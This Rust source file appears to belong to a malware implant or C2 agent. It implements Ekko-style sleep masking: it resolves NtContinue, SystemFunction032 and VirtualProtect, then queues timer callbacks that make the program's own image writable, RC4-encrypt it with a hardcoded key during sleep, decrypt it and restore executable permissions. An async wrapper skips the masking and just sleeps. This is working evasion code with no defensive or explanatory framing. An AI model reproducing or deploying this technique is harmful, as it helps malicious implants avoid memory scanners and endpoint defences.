use crate::recovery::helpers::pe::{IMAGE_DOS_HEADER, IMAGE_NT_HEADERS64};
use std::ffi::c_void;
use tracing::debug;
use windows_sys::Win32::Foundation::{CloseHandle, HANDLE};
use windows_sys::Win32::System::Diagnostics::Debug::{CONTEXT, RtlCaptureContext};
use windows_sys::Win32::System::LibraryLoader::{GetModuleHandleW, GetProcAddress};
use windows_sys::Win32::System::Memory::PAGE_READWRITE;
use windows_sys::Win32::System::Threading::{
    CreateEventW, CreateTimerQueue, CreateTimerQueueTimer, DeleteTimerQueue,
    WT_EXECUTEINTIMERTHREAD, WaitForSingleObject,
};

#[repr(C)]
struct Ustring {
    length: u32,
    maximum_length: u32,
    buffer: *mut c_void,
}

pub async fn stealth_sleep(millis: u32) {
    if millis == 0 {
        return;
    }

    // Utilize tokio::time::sleep to avoid blocking the current_thread executor.
    // While this loses the Ekko-style memory masking during the jitter, it ensures
    // that the agent remains responsive and other tasks can progress.
    tokio::time::sleep(std::time::Duration::from_millis(millis as u64)).await;
}

#[allow(dead_code)]
pub fn stealth_sleep_sync(millis: u32) {
    if millis == 0 {
        return;
    }

    unsafe {
        if let Err(e) = try_ekko_sleep(millis) {
            debug!("Ekko sleep unavailable ({}), utilizing standard sleep", e);
            std::thread::sleep(std::time::Duration::from_millis(millis as u64));
        }
    }
}

unsafe fn try_ekko_sleep(millis: u32) -> Result<(), String> {
    let get_module = |name: &str| -> Result<HANDLE, String> {
        let wide: Vec<u16> = name.encode_utf16().chain(std::iter::once(0)).collect();

        unsafe {
            let handle = GetModuleHandleW(wide.as_ptr());
            if handle.is_null() {
                return Err(format!("failed to get handle for {}", name));
            }
            Ok(handle)
        }
    };

    let h_ntdll = get_module("ntdll.dll")?;
    let h_advapi32 = get_module("advapi32.dll")?;
    let h_kernel32 = get_module("kernel32.dll")?;

    let (p_nt_continue, p_system_function_032, p_virtual_protect, p_set_event) = unsafe {
        let p_nt = GetProcAddress(h_ntdll, "NtContinue\0".as_ptr())
            .ok_or("NtContinue not found")?;
        let p_sys = GetProcAddress(h_advapi32, "SystemFunction032\0".as_ptr())
            .ok_or("SystemFunction032 not found")?;
        let p_vp = GetProcAddress(h_kernel32, "VirtualProtect\0".as_ptr())
            .ok_or("VirtualProtect not found")?;
        let p_se =
            GetProcAddress(h_kernel32, "SetEvent\0".as_ptr()).ok_or("SetEvent not found")?;
        (p_nt, p_sys, p_vp, p_se)
    };

    let (base, image_size) = unsafe {
        let base_mod = GetModuleHandleW(std::ptr::null());
        if base_mod.is_null() {
            return Err("failed to get base address".to_string());
        }
        let base_ptr = base_mod as *mut c_void;
        let dos_header = &*(base_ptr as *const IMAGE_DOS_HEADER);

        if dos_header.e_magic != 0x5A4D {
            return Err("invalid DOS header magic".to_string());
        }

        let nt_headers_ptr =
            base_ptr.add(dos_header.e_lfanew as usize) as *const IMAGE_NT_HEADERS64;
        let nt_headers = &*nt_headers_ptr;

        if nt_headers.signature != 0x00004550 {
            // PE\0\0
            return Err("invalid NT header signature".to_string());
        }

        (base_ptr, nt_headers.optional_header.size_of_image as usize)
    };

    let mut key_data = [0u8; 16];

    for i in 0..16 {
        key_data[i] = (i * 0x33) as u8;
    }

    let mut key = Ustring {
        length: 16,
        maximum_length: 16,
        buffer: key_data.as_mut_ptr() as *mut c_void,
    };

    let mut data = Ustring {
        length: image_size as u32,
        maximum_length: image_size as u32,
        buffer: base,
    };

    let (event, timer_queue) = unsafe {
        let evt = CreateEventW(std::ptr::null(), 1, 0, std::ptr::null());
        if evt.is_null() {
            return Err("CreateEventW failed".to_string());
        }

        let tq = CreateTimerQueue();
        if tq.is_null() {
            let _ = CloseHandle(evt);
            return Err("CreateTimerQueue failed".to_string());
        }

        (evt, tq)
    };

    let mut old_protect: u32 = 0;
    let mut ctx_template: CONTEXT = unsafe { std::mem::zeroed() };

    unsafe { RtlCaptureContext(&mut ctx_template) };

    let mut ctx_prot_rw = ctx_template;
    ctx_prot_rw.Rip = p_virtual_protect as usize as u64;
    ctx_prot_rw.Rcx = base as u64;
    ctx_prot_rw.Rdx = image_size as u64;
    ctx_prot_rw.R8 = PAGE_READWRITE as u64;
    ctx_prot_rw.R9 = &mut old_protect as *mut _ as u64;

    let mut ctx_mask = ctx_template;
    ctx_mask.Rip = p_system_function_032 as usize as u64;
    ctx_mask.Rcx = &mut data as *mut _ as u64;
    ctx_mask.Rdx = &mut key as *mut _ as u64;

    let mut ctx_unmask = ctx_template;
    ctx_unmask.Rip = p_system_function_032 as usize as u64;
    ctx_unmask.Rcx = &mut data as *mut _ as u64;
    ctx_unmask.Rdx = &mut key as *mut _ as u64;

    let mut ctx_prot_rx = ctx_template;
    ctx_prot_rx.Rip = p_virtual_protect as usize as u64;
    ctx_prot_rx.Rcx = base as u64;
    ctx_prot_rx.Rdx = image_size as u64;
    ctx_prot_rx.R8 = 0x40; // PAGE_EXECUTE_READWRITE
    ctx_prot_rx.R9 = &mut old_protect as *mut _ as u64;

    let mut ctx_set_event = ctx_template;
    ctx_set_event.Rip = p_set_event as usize as u64;
    ctx_set_event.Rcx = event as u64;

    debug!("queueing Ekko sleep mask chain ({}ms)", millis);
    let mut h_timer: HANDLE = std::ptr::null_mut();

    unsafe {
        if CreateTimerQueueTimer(
            &mut h_timer,
            timer_queue,
            Some(std::mem::transmute(p_nt_continue)),
            &ctx_prot_rw as *const _ as *const c_void,
            10,
            0,
            WT_EXECUTEINTIMERTHREAD,
        ) == 0 {
            let _ = DeleteTimerQueue(timer_queue);
            let _ = CloseHandle(event);
            return Err("CreateTimerQueueTimer (prot_rw) failed".to_string());
        }

        if CreateTimerQueueTimer(
            &mut h_timer,
            timer_queue,
            Some(std::mem::transmute(p_nt_continue)),
            &ctx_mask as *const _ as *const c_void,
            20,
            0,
            WT_EXECUTEINTIMERTHREAD,
        ) == 0 {
            let _ = DeleteTimerQueue(timer_queue);
            let _ = CloseHandle(event);
            return Err("CreateTimerQueueTimer (mask) failed".to_string());
        }

        if CreateTimerQueueTimer(
            &mut h_timer,
            timer_queue,
            Some(std::mem::transmute(p_nt_continue)),
            &ctx_unmask as *const _ as *const c_void,
            millis + 30,
            0,
            WT_EXECUTEINTIMERTHREAD,
        ) == 0 {
            let _ = DeleteTimerQueue(timer_queue);
            let _ = CloseHandle(event);
            return Err("CreateTimerQueueTimer (unmask) failed".to_string());
        }

        if CreateTimerQueueTimer(
            &mut h_timer,
            timer_queue,
            Some(std::mem::transmute(p_nt_continue)),
            &ctx_prot_rx as *const _ as *const c_void,
            millis + 40,
            0,
            WT_EXECUTEINTIMERTHREAD,
        ) == 0 {
            let _ = DeleteTimerQueue(timer_queue);
            let _ = CloseHandle(event);
            return Err("CreateTimerQueueTimer (prot_rx) failed".to_string());
        }

        if CreateTimerQueueTimer(
            &mut h_timer,
            timer_queue,
            Some(std::mem::transmute(p_nt_continue)),
            &ctx_set_event as *const _ as *const c_void,
            millis + 50,
            0,
            WT_EXECUTEINTIMERTHREAD,
        ) == 0 {
            let _ = DeleteTimerQueue(timer_queue);
            let _ = CloseHandle(event);
            return Err("CreateTimerQueueTimer (set_event) failed".to_string());
        }
    }

    unsafe { WaitForSingleObject(event, 0xFFFFFFFF) };
    unsafe {
        let _ = DeleteTimerQueue(timer_queue);
        let _ = CloseHandle(event);
    }

    debug!("Ekko sleep masking cycle complete");
    Ok(())
}
